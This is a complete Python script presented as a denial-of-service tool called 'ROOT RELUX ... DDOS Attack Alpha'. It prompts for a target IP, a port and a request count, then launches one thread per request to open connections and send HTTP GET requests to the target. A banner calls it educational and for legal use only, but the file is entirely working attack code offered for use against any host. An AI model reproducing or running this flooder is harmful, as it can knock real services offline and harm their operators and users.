import socket
import time
import pyfiglet
from colorama import Fore, Style, init
import threading
import re

# Initialize Colorama
init(autoreset=True)

def print_attractive_text():
    title_font = pyfiglet.Figlet(font='slant')
    subtitle_font = pyfiglet.Figlet(font='small')

    title = "ROOT RELUX"
    subtitle = "Made by JUNAYAD AHSAN"
    description = "DDOS Attack Alpha"

    print(Fore.CYAN + title_font.renderText(title))
    print(Fore.YELLOW + subtitle_font.renderText(subtitle))
    print(Fore.GREEN + f"This code is made for {Style.BRIGHT}educational purposes.")
    print(Fore.MAGENTA + f"By this code, people can learn about {Style.BRIGHT}{description}.")
    print(Fore.RED + f"Use this tool for {Style.BRIGHT}legal purposes.")

def is_valid_ip(ip):
    # Regular expression for validating an IP address
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    return pattern.match(ip) is not None

def send_request(ip, port):
    try:
        # Create a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          # Set timeout to 3 seconds

        # Connect to the target IP
        sock.connect((ip, port))

        # Prepare the HTTP request string
        request = f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n"

        # Send the HTTP request
        sock.sendall(request.encode())

        # Receive the response from the server (limit to 1024 bytes)
        response = sock.recv(1024)

        # Check if the response contains HTTP 200 OK status
        if b"HTTP/1.1 200 OK" in response:
            print(Fore.GREEN + f"Request sent to {ip}:{port}")
        else:
            print(Fore.YELLOW + f"Request failed with status code: {response.decode().split()[1]}")

        # Close the socket after use
        sock.close()

    except socket.timeout:
        print(Fore.RED + f"Request timed out for {ip}:{port}")
    except socket.error:
        print(Fore.RED + f"Unable to connect to {ip}:{port}")
    except Exception as e:
        print(Fore.RED + f"An error occurred: {str(e)}")

def run_attack(n, ip, port):
    threads = []
    for _ in range(n):
        thread = threading.Thread(target=send_request, args=(ip, port))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    print_attractive_text()

    try:
        n = int(input("How many times do you want to send requests?: "))
        if n <= 0:
            raise ValueError("Number of requests must be a positive integer.")
    except ValueError as e:
        print(Fore.RED + f"Invalid input: {e}")
        exit(1)

    ip = input('Input your target IP address (e.g., 192.168.1.1): ').strip()
    if not is_valid_ip(ip):
        print(Fore.RED + "Invalid IP address format.")
        exit(1)

    try:
        port = int(input('Choose port (80 for HTTP, 443 for HTTPS, etc.): '))
        if port <= 0 or port > 65535:
            raise ValueError("Port number must be between 1 and 65535.")
    except ValueError as e:
        print(Fore.RED + f"Invalid port: {e}")
        exit(1)

    run_attack(n, ip, port)